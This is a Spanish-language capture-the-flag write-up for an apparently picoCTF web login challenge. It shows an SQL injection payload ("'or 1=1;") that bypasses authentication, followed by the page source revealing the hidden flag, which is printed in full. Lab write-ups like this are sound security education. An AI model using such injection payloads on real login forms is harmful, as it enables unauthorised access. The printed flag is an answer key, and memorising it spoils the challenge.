## Descripción 
Can you login to this website?

Additional details will be available after launching your challenge instance.

## Datos de Acceso al Nivel
user: carlosof / kali
password:

## Solución
- Iniciamos el launcher del reto e ingresamos al link.
- En el `username` ingresaremos `admin` como lo indica la pista, el la contraseña ingresaremos una inyección sql: 
	- `'or 1=1;`
- Una vez adentro, nos mostrara la siguiente información.
```bash
username: admin
password: 'or 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password=''or 1=1;'

# Logged in! But can you see the flag, it is in plainsight.
```
- Ahora simplemente presionamos en el teclado `Ctrl+U` y nos redirigirá a la siguiente pagina 
```bash
<pre>username: admin
password: &#039;or 1=1;
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039;or 1=1;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
```
- Flag: 
	- picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
## Notas Adicionales
Al presionar `Ctrl + U`, el navegador abrirá una nueva pestaña o ventana donde muestra el código HTML de la página web en formato de texto.
## Referencias 
https://play.picoctf.org/practice/challenge/304
